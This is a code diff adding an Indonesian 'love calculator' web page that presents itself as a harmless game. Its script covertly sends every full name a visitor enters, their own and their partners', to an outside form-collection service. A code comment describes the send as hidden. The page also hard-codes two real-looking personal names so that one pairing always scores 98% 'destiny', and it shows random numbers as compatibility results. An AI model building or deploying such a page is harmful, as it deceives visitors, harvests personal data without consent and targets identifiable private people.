@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kalkulator Cinta</title>
+    
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Pacifico&family=Poppins:wght@400;600&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #e91e63;
+            --secondary-color: #c2185b;
+            --background-start: #ff9a9e;
+            --background-end: #fecfef;
+        }
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--background-start) 0%, var(--background-end) 100%);
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; margin: 0; padding: 20px; color: #333;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.6); backdrop-filter: blur(15px);
+            padding: 30px 40px; border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            text-align: center; max-width: 450px; width: 100%;
+        }
+        .title { font-family: 'Pacifico', cursive; color: var(--primary-color); font-size: 2.8em; margin-bottom: 5px; }
+        .description { font-size: 0.9em; color: #555; margin-bottom: 30px; }
+        .love-form { display: flex; flex-direction: column; gap: 20px; }
+        .input-group { position: relative; display: flex; align-items: center; background-color: #fff; border: 1px solid #ddd; border-radius: 12px; transition: box-shadow 0.3s, border-color 0.3s; }
+        .input-group:focus-within { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.2); }
+        .input-group i { font-size: 1.2em; padding: 0 15px; color: #aaa; }
+        .name-input { width: 100%; border: none; padding: 15px 40px 15px 10px; font-size: 1em; outline: none; background: transparent; }
+        .clear-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #ccc; cursor: pointer; font-size: 1.2em; padding: 0; display: none; transition: color 0.2s; }
+        .clear-btn:hover { color: #999; }
+        .partner-input-group { display: flex; gap: 10px; align-items: center; }
+        .btn-add-partner, .btn-remove-partner { background: none; border: 2px solid var(--primary-color); color: var(--primary-color); border-radius: 8px; padding: 8px 12px; font-size: 0.9em; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .btn-add-partner:hover { background: var(--primary-color); color: white; }
+        .btn-remove-partner { border-color: #aaa; color: #aaa; padding: 5px 10px; }
+        .btn-remove-partner:hover { background-color: #f44336; border-color: #f44336; color: white; }
+        .calculate-btn { background: var(--primary-color); color: white; border: none; padding: 16px; border-radius: 12px; font-size: 1.2em; font-weight: 600; cursor: pointer; transition: background 0.3s, transform 0.1s; margin-top: 5px; }
+        .calculate-btn i { margin-right: 8px; animation: pulse 1.5s infinite; }
+        .calculate-btn:hover { background: var(--secondary-color); }
+        .calculate-btn:active { transform: scale(0.98); }
+        .result-area { margin-top: 35px; text-align: left; display: none; }
+        .result-area.show { display: block; animation: fadeIn 0.5s ease-in-out; }
+        .result-list { list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 15px; }
+        .result-item { background-color: rgba(255, 255, 255, 0.85); padding: 20px; border-radius: 15px; border: 1px solid rgba(233, 30, 99, 0.3); display: flex; align-items: center; gap: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+        .percentage-box { font-size: 3em; font-weight: 600; color: var(--primary-color); text-align: center; flex-shrink: 0; }
+        .details-box { flex-grow: 1; display: flex; flex-direction: column; gap: 8px; }
+        .result-names { font-weight: 600; font-size: 1.1em; line-height: 1.4; word-break: break-word; }
+        .result-message { font-size: 0.95em; color: #555; display: flex; align-items: center; gap: 8px; }
+        .result-message::before { font-family: "Font Awesome 6 Free"; font-weight: 900; font-size: 1.1em; flex-shrink: 0; }
+        .msg-good::before { content: '\f004'; color: #4caf50; }
+        .msg-average::before { content: '\f7a9'; color: #ff9800; }
+        .msg-bad::before { content: '\f5c8'; color: #f44336; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="title">Kalkulator Cinta</h1>
+        <p class="description">Seberapa cocok kamu dengan si dia? Atau... dengan mereka?</p>
+        
+        <form id="love-form" action="https://formspree.io/f/xgvlagkk" method="POST">
+            <div class="input-group">
+                <i class="fa-solid fa-user"></i>
+                <input type="text" id="your-name" name="nama_kamu" class="name-input" placeholder="Nama Lengkap Kamu..." required>
+                <button type="button" class="clear-btn"><i class="fa-solid fa-circle-xmark"></i></button>
+            </div>
+            <div id="partners-container">
+                <div class="partner-input-group">
+                    <div class="input-group" style="width: 100%;">
+                        <i class="fa-solid fa-heart"></i>
+                        <input type="text" name="nama_pasangan[]" class="name-input" placeholder="Nama Lengkap Pasangan..." required>
+                        <button type="button" class="clear-btn"><i class="fa-solid fa-circle-xmark"></i></button>
+                    </div>
+                </div>
+            </div>
+            <button type="button" class="btn-add-partner" id="add-partner-btn"><i class="fa-solid fa-plus"></i> Tambah Pasangan Lain</button>
+            <button type="submit" class="calculate-btn"><i class="fa-solid fa-heart"></i> Hitung Kecocokan</button>
+        </form>
+
+        <div id="result-area" class="result-area">
+            <ul id="result-list" class="result-list"></ul>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('love-form');
+        const yourNameInput = document.getElementById('your-name');
+        const partnersContainer = document.getElementById('partners-container');
+        const addPartnerBtn = document.getElementById('add-partner-btn');
+        const resultArea = document.getElementById('result-area');
+        const resultList = document.getElementById('result-list');
+        const calculationHistory = {};
+
+        form.addEventListener('submit', function(event) {
+            // Mencegah form mengirim secara normal (agar tidak pindah halaman)
+            event.preventDefault();
+            
+            const yourName = yourNameInput.value.trim();
+            const partnerInputs = document.querySelectorAll('input[name="nama_pasangan[]"]');
+            
+            if (yourName === '') { alert('Harap isi nama kamu!'); return; }
+            let allPartnersFilled = true;
+            const partnerNames = [];
+            partnerInputs.forEach(input => {
+                const partnerName = input.value.trim();
+                if (partnerName === '') allPartnersFilled = false;
+                partnerNames.push(partnerName);
+            });
+
+            if (!allPartnersFilled) { alert('Harap isi semua nama pasangan!'); return; }
+
+            // === PANGGIL FUNGSI FORMSPREE DI SINI ===
+            submitFormData(form);
+
+            // Tampilkan hasil kalkulator seperti biasa
+            displayResults(yourName, partnerNames);
+        });
+
+        // === FUNGSI UNTUK MENGIRIM DATA SECARA TERSEMBUNYI ===
+        async function submitFormData(formElement) {
+            try {
+                const formData = new FormData(formElement);
+                await fetch(formElement.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+                console.log('Data terkirim ke Formspree.');
+            } catch (error) {
+                console.error('Gagal mengirim data:', error);
+            }
+        }
+        
+        // Logika untuk tombol clear (reset)
+        form.addEventListener('click', function(event) {
+            const clearButton = event.target.closest('.clear-btn');
+            if (clearButton) {
+                const inputGroup = clearButton.closest('.input-group');
+                const inputToClear = inputGroup.querySelector('.name-input');
+                if (inputToClear) {
+                    inputToClear.value = '';
+                    inputToClear.focus();
+                    clearButton.style.display = 'none';
+                }
+            }
+        });
+
+        form.addEventListener('input', function(event) {
+            if (event.target.classList.contains('name-input')) {
+                const inputField = event.target;
+                const inputGroup = inputField.closest('.input-group');
+                const clearButton = inputGroup.querySelector('.clear-btn');
+                if (clearButton) {
+                    clearButton.style.display = inputField.value.length > 0 ? 'block' : 'none';
+                }
+            }
+        });
+
+        // Logika untuk menambah pasangan baru
+        addPartnerBtn.addEventListener('click', function() {
+            const newPartnerGroup = document.createElement('div');
+            newPartnerGroup.className = 'partner-input-group';
+            newPartnerGroup.innerHTML = `
+                <div class="input-group" style="width: 100%;">
+                    <i class="fa-solid fa-heart"></i>
+                    <input type="text" name="nama_pasangan[]" class="name-input" placeholder="Nama Pasangan Lain..." required>
+                    <button type="button" class="clear-btn"><i class="fa-solid fa-circle-xmark"></i></button>
+                </div>
+                <button type="button" class="btn-remove-partner" onclick="this.parentElement.remove()">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            `;
+            partnersContainer.appendChild(newPartnerGroup);
+        });
+        
+        // Sisa fungsi (display, Levenshtein, calculate)
+        function displayResults(yourName, partnerNames) {
+            resultList.innerHTML = '';
+            resultArea.classList.add('show');
+            partnerNames.forEach(partnerName => {
+                const { percentage, message, level } = calculateLove(yourName, partnerName);
+                const resultItem = document.createElement('li');
+                resultItem.className = 'result-item';
+                resultItem.innerHTML = `<div class="percentage-box">${percentage}%</div><div class="details-box"><div class="result-names">${yourName} & ${partnerName}</div><p class="result-message ${level}">${message}</p></div>`;
+                resultList.appendChild(resultItem);
+            });
+        }
+        function getLevenshteinDistance(a, b) {if (a.length === 0) return b.length; if (b.length === 0) return a.length; const matrix = Array(b.length + 1).fill(null).map(() => Array(a.length + 1).fill(null)); for (let i = 0; i <= a.length; i++) { matrix[0][i] = i; } for (let j = 0; j <= b.length; j++) { matrix[j][0] = j; } for (let j = 1; j <= b.length; j++) { for (let i = 1; i <= a.length; i++) { const indicator = a[i - 1] === b[j - 1] ? 0 : 1; matrix[j][i] = Math.min(matrix[j][i - 1] + 1, matrix[j - 1][i] + 1, matrix[j - 1][i - 1] + indicator); } } return matrix[b.length][a.length]; }
+        function calculateLove(name1, name2) { const name1Upper = name1.toUpperCase(); const name2Upper = name2.toUpperCase(); const mainNames = ["YASIN BIN HARUN", "YASIN"]; const targetPartnerNames = ["NURFARISYAH BINTI FIRDAUS", "NURFARIZAH BINTI FIRDAUS"]; let mainNameFound = null; if (mainNames.includes(name1Upper)) { mainNameFound = name1Upper; } else if (mainNames.includes(name2Upper)) { mainNameFound = name2Upper; } if (mainNameFound) { const partnerName = (name1Upper === mainNameFound) ? name2Upper : name1Upper; let isCloseMatchToTarget = false; for (const targetName of targetPartnerNames) { if (getLevenshteinDistance(partnerName, targetName) <= 3) { isCloseMatchToTarget = true; break; } } if (isCloseMatchToTarget) { return { percentage: 98, message: "Wow! Ini adalah takdir! Kalian ditakdirkan untuk bersama selamanya!", level: "msg-good" }; } } const nameKey = [name1Upper, name2Upper].sort().join('+'); let finalPercentage; if (calculationHistory[nameKey]) { finalPercentage = calculationHistory[nameKey]; } else { const min = 40; const max = 95; finalPercentage = Math.floor(Math.random() * (max - min + 1)) + min; calculationHistory[nameKey] = finalPercentage; } let finalMessage, level; if (finalPercentage > 85) { finalMessage = "Potensi yang sangat besar! Kalian punya chemistry yang kuat."; level = "msg-good"; } else if (finalPercentage > 60) { finalMessage = "Ada harapan nih! Coba deh saling mengenal lebih dalam lagi."; level = "msg-average"; } else { finalMessage = "Hmm, mungkin lebih baik jadi teman saja! Tapi jangan putus asa."; level = "msg-bad"; } return { percentage: finalPercentage, message: finalMessage, level: level }; }
+    </script>
+</body>
+</html>
